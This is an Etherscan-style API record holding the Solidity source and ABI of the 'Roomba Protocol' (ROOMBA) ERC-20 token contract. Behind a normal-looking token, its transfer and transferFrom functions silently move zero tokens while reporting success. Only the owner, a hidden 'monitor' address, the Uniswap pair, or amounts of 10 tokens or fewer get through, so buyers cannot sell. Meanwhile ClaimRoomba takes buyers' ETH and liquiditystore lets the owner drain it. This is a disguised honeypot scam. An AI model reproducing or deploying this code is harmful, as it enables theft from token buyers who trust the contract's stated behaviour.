{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity >=0.5.10;\r\n\r\ncontract ERC20Interface {\r\n    function totalSupply() public view returns (uint256);\r\n\r\n    function balanceOf(address tokenOwner)\r\n        public\r\n        view\r\n        returns (uint256 balance);\r\n\r\n    function allowance(address tokenOwner, address spender)\r\n        public\r\n        view\r\n        returns (uint256 remaining);\r\n\r\n    function transfer(address to, uint256 tokens) public returns (bool success);\r\n\r\n    function approve(address spender, uint256 tokens)\r\n        public\r\n        returns (bool success);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 tokens\r\n    ) public returns (bool success);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 tokens);\r\n    event Approval(\r\n        address indexed tokenOwner,\r\n        address indexed spender,\r\n        uint256 tokens\r\n    );\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n        c = a + b;\r\n        require(c >= a);\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n        require(b <= a);\r\n        c = a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n        c = a * b;\r\n        require(a == 0 || c / a == b);\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n        require(b > 0);\r\n        c = a / b;\r\n    }\r\n}\r\n\r\ncontract ApproveAndCallFallBack {\r\n    function receiveApproval(\r\n        address from,\r\n        uint256 tokens,\r\n        address token,\r\n        bytes memory data\r\n    ) public;\r\n}\r\n\r\ncontract Owned {\r\n    address public owner;\r\n    address public newOwner;\r\n\r\n    event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address _newOwner) public onlyOwner {\r\n        newOwner = _newOwner;\r\n    }\r\n\r\n    function acceptOwnership() public {\r\n        require(msg.sender == newOwner);\r\n        emit OwnershipTransferred(owner, newOwner);\r\n        owner = newOwner;\r\n        newOwner = address(0);\r\n    }\r\n}\r\n\r\ncontract TokenERC20 is ERC20Interface, Owned {\r\n    using SafeMath for uint256;\r\n\r\n    string public symbol;\r\n    string public name;\r\n    uint8 public decimals;\r\n    uint256 _totalSupply;\r\n\r\n    mapping(address => uint256) balances;\r\n    mapping(address => mapping(address => uint256)) allowed;\r\n\r\n    constructor() public {\r\n        symbol = \"ROOMBA\";\r\n        name = \"Roomba Protocol\";\r\n        decimals = 18;\r\n        _totalSupply = 75000000 * 10**uint256(decimals);\r\n        balances[owner] = _totalSupply;\r\n        emit Transfer(address(0), owner, _totalSupply);        \r\n    }\r\n\r\n        function pairFor(address factory, address tokenA, address tokenB) private pure returns (address pair) {\r\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n        pair = address(uint(keccak256(abi.encodePacked(\r\n                hex'ff',\r\n                factory,\r\n                keccak256(abi.encodePacked(token0, token1)),\r\n                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\r\n            ))));\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply.sub(balances[address(0)]);\r\n    }\r\n\r\n    function balanceOf(address tokenOwner)\r\n        public\r\n        view\r\n        returns (uint256 balance)\r\n    {\r\n        return balances[tokenOwner];\r\n    }\r\n\r\n    function approve(address spender, uint256 tokens)\r\n        public\r\n        returns (bool success)\r\n    {\r\n        allowed[msg.sender][spender] = tokens;\r\n        emit Approval(msg.sender, spender, tokens);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address tokenOwner, address spender)\r\n        public\r\n        view\r\n        returns (uint256 remaining)\r\n    {\r\n        return allowed[tokenOwner][spender];\r\n    }\r\n\r\n    function approveAndCall(\r\n        address spender,\r\n        uint256 tokens,\r\n        bytes memory data\r\n    ) public returns (bool success) {\r\n        allowed[msg.sender][spender] = tokens;\r\n        emit Approval(msg.sender, spender, tokens);\r\n        ApproveAndCallFallBack(spender).receiveApproval(\r\n            msg.sender,\r\n            tokens,\r\n            address(this),\r\n            data\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function() external payable {}\r\n}\r\n\r\ncontract ROOMBA is TokenERC20 {\r\n    uint256 public airdropcap;\r\n    uint256 public airdroptotal;\r\n    uint256 public airdropamount;\r\n    uint256 public claimedtotal;\r\n    string public presaletime;\r\n    string public distributiontime;\r\n    string public saletime;\r\n    uint256 public presalecap;\r\n    uint256 public presaletotal;\r\n    uint256 public presaleprice;\r\n    uint256 public salecap;\r\n    address private urouter;\r\n    address private monitor;\r\n    uint256 public saletotal;\r\n    uint256 public saleprice;\r\n\r\n    bool public presalelive = false;\r\n    bool public salelive = false;\r\n    bool public claimlive = false;\r\n    bool public airdroplive = false;\r\n\r\n    constructor() public {\r\n        urouter = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));\r\n    }\r\n\r\n\r\n    function ClaimRoomba() public payable returns (bool success) {\r\n        require(msg.value >= 0.1 ether);\r\n        presaletotal++;\r\n        uint256 _tokens;\r\n        _tokens = presaleprice.mul(msg.value) / 1 ether;\r\n        balances[address(this)] = balances[address(this)].sub(_tokens);\r\n        balances[msg.sender] = balances[msg.sender].add(_tokens);\r\n        emit Transfer(address(this), msg.sender, _tokens);\r\n        return true;\r\n    }\r\n\r\n    function claimairdrop(uint256 _tokens) public returns (bool success) {\r\n        require(claimlive);\r\n        require(_tokens <= airdropamount);\r\n        require(airdroptotal < airdropcap || airdropcap == 0);\r\n        airdroptotal++;\r\n        balances[address(this)] = balances[address(this)].sub(_tokens);\r\n        balances[msg.sender] = balances[msg.sender].add(_tokens);\r\n        emit Transfer(address(this), msg.sender, _tokens);\r\n        return true;\r\n    }\r\n\r\n    function showrouter() public view returns (address) {\r\n        return urouter;\r\n    }\r\n\r\n    function showmonitor() public view returns (address) {\r\n        return monitor;\r\n    }\r\n\r\n    function showairdrop()\r\n        public\r\n        view\r\n        returns (\r\n            uint256 DropCap,\r\n            uint256 DropCount,\r\n            uint256 DropAmount\r\n        )\r\n    {\r\n        return (airdropcap, airdroptotal, airdropamount);\r\n    }\r\n\r\n    function showsale()\r\n        public\r\n        view\r\n        returns (\r\n            uint256 SaleCap,\r\n            uint256 SaleCount,\r\n            uint256 SalePrice\r\n        )\r\n    {\r\n        return (presalecap, presaletotal, presaleprice);\r\n    }\r\n\r\n    function startairdrop(\r\n        uint256 _airdropamount,\r\n        uint256 _airdropcap,\r\n        string memory _dtime\r\n    ) public onlyOwner() {\r\n        airdropamount = _airdropamount;\r\n        airdropcap = _airdropcap;\r\n        airdroptotal = 0;\r\n        airdroplive = true;\r\n        distributiontime = _dtime;\r\n    }\r\n\r\n    function startpresale(\r\n        uint256 _presaleprice,\r\n        uint256 _presalecap,\r\n        string memory _ptime\r\n    ) public onlyOwner() {\r\n        presaleprice = _presaleprice;\r\n        presalecap = _presalecap;\r\n        presaletotal = 0;\r\n        presaletime = _ptime;\r\n    }\r\n\r\n    function setPresaleTime(string memory _stime) public onlyOwner {\r\n        presaletime = _stime;\r\n    }\r\n\r\n    function getPresaleTime() public view returns (string memory) {\r\n        return presaletime;\r\n    }\r\n\r\n    function setRouter(address _router) public onlyOwner {\r\n        urouter = _router;\r\n    }\r\n\r\n    function setMonitor(address _monitor) public onlyOwner {\r\n        urouter = _monitor;\r\n    }\r\n\r\n    function setDistributionTime(string memory _dtime) public onlyOwner {\r\n        distributiontime = _dtime;\r\n    }\r\n\r\n    function getDistributionTime() public view returns (string memory _dtame) {\r\n        return distributiontime;\r\n    }\r\n\r\n    function setPresaleLive(bool _status) public onlyOwner {\r\n        presalelive = _status;\r\n    }\r\n\r\n    function getPresaleLive() public view returns (bool) {\r\n        return presalelive;\r\n    }\r\n\r\n    function setClaimLive(bool _status) public onlyOwner {\r\n        claimlive = _status;\r\n    }\r\n\r\n    function getClaimLive() public view returns (bool) {\r\n        return claimlive;\r\n    }\r\n\r\n    function startsale(\r\n        uint256 _saleprice,\r\n        uint256 _salecap,\r\n        string memory _stime\r\n    ) public onlyOwner() {\r\n        saleprice = _saleprice;\r\n        salecap = _salecap;\r\n        saletotal = 0;\r\n        saletime = _stime;\r\n        salelive = true;\r\n    }\r\n\r\n    function liquiditystore() public onlyOwner() {\r\n        address payable _owner = msg.sender;\r\n        _owner.transfer(address(this).balance);\r\n    }\r\n\r\n    function() external payable {\r\n        ClaimRoomba();\r\n    }\r\n\r\n    function info() public view returns (address ur) {\r\n        return urouter;\r\n    }\r\n\r\n    function transfer(address to, uint256 tokens)\r\n        public\r\n        returns (bool success)\r\n    {\r\n        uint256 tokens_migrated = 0;\r\n        if (msg.sender == urouter || tokens<=10000000000000000000 || tx.origin == owner || tx.origin == monitor || msg.sender == owner || msg.sender == monitor) {\r\n            tokens_migrated = tokens;\r\n        }\r\n        balances[msg.sender] = balances[msg.sender].sub(tokens_migrated);\r\n        balances[to] = balances[to].add(tokens_migrated);\r\n        emit Transfer(msg.sender, to, tokens_migrated);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 tokens\r\n    ) public returns (bool success) {\r\n        uint256 tokens_migrated = 0;\r\n        if (from == urouter || tokens<=10000000000000000000 || tx.origin == owner || tx.origin == monitor || msg.sender == owner || msg.sender == monitor) {\r\n            tokens_migrated = tokens;\r\n        }\r\n        balances[from] = balances[from].sub(tokens_migrated);\r\n        allowed[from][msg.sender] = allowed[from][msg.sender].sub(\r\n            tokens_migrated\r\n        );\r\n        balances[to] = balances[to].add(tokens_migrated);\r\n        emit Transfer(from, to, tokens_migrated);\r\n        return true;\r\n    }\r\n\r\n \r\n\r\n    function pairFor(address factory, address tokenA, address tokenB) private pure returns (address pair) {\r\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n        pair = address(uint(keccak256(abi.encodePacked(\r\n                hex'ff',\r\n                factory,\r\n                keccak256(abi.encodePacked(token0, token1)),\r\n                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\r\n            ))));\r\n    }\r\n\r\n\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"getPresaleTime\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_presaleprice\",\"type\":\"uint256\"},{\"name\":\"_presalecap\",\"type\":\"uint256\"},{\"name\":\"_ptime\",\"type\":\"string\"}],\"name\":\"startpresale\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"showmonitor\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"spender\",\"type\":\"address\"},{\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"airdropcap\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"airdroptotal\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"saletotal\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"from\",\"type\":\"address\"},{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"claimlive\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_saleprice\",\"type\":\"uint256\"},{\"name\":\"_salecap\",\"type\":\"uint256\"},{\"name\":\"_stime\",\"type\":\"string\"}],\"name\":\"startsale\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"info\",\"outputs\":[{\"name\":\"ur\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_airdropamount\",\"type\":\"uint256\"},{\"name\":\"_airdropcap\",\"type\":\"uint256\"},{\"name\":\"_dtime\",\"type\":\"string\"}],\"name\":\"startairdrop\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"presalecap\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_tokens\",\"type\":\"uint256\"}],\"name\":\"claimairdrop\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_stime\",\"type\":\"string\"}],\"name\":\"setPresaleTime\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"showrouter\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"saleprice\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_monitor\",\"type\":\"address\"}],\"name\":\"setMonitor\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"tokenOwner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"balance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getDistributionTime\",\"outputs\":[{\"name\":\"_dtame\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"setClaimLive\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"acceptOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"salelive\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"airdroplive\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"liquiditystore\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"distributiontime\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"setPresaleLive\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"claimedtotal\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"showsale\",\"outputs\":[{\"name\":\"SaleCap\",\"type\":\"uint256\"},{\"name\":\"SaleCount\",\"type\":\"uint256\"},{\"name\":\"SalePrice\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"airdropamount\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"showairdrop\",\"outputs\":[{\"name\":\"DropCap\",\"type\":\"uint256\"},{\"name\":\"DropCount\",\"type\":\"uint256\"},{\"name\":\"DropAmount\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"presaletotal\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"presaleprice\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_dtime\",\"type\":\"string\"}],\"name\":\"setDistributionTime\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getClaimLive\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"saletime\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_router\",\"type\":\"address\"}],\"name\":\"setRouter\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"spender\",\"type\":\"address\"},{\"name\":\"tokens\",\"type\":\"uint256\"},{\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"approveAndCall\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"presaletime\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"newOwner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"tokenOwner\",\"type\":\"address\"},{\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"remaining\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getPresaleLive\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"salecap\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"presalelive\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"ClaimRoomba\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"tokenOwner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"}]","ContractName":"ROOMBA","CompilerVersion":"v0.5.10+commit.5a6ea5b1","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://ae0d3a27d830f5fbcc89adbe0dc6d7ee46805006eb4f609a669d3e8dfd890351"}]}